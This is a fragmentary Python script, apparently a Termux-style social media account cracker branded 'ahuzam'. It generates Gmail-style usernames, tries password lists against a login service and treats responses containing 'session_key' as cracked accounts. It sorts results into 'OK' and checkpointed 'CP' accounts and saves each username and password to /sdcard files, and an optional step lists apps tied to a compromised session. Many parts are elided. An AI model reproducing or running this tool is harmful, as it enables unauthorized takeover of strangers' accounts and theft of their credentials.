...
/_/ |_/_//_/\____/ /___/_/ |_/_/  /_/  
                                    \033
\033[1;93m=================================
\033[1;97m Owner  :AHUZAM HUSSAIN:/
\033[1;97m TIKTOK : ahuxam :/
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('ahutn',' ahu-code=ahuzam-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','ahu-182^)Code=ahuzam-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .ahuzam')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.ahuzam','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.ahuzam','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.ahuzam', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/ahuxxam-OK.txt")
    print('\033[1;93m='*25)
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mahu-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mahuzam-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/ahuxxam-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mahuzam-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/ahuxxam-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mahuzam-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/ahuzam-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mahuxxam-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/ahuxxam-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
...
def andom():
    ...
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/ahuzam-OK.txt")
    print('\033[1;93m='*25)
    print()    
    def start(user):
     try:
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mahuxxam-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/ahuxxam-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mahuzam-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/ahuzam-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
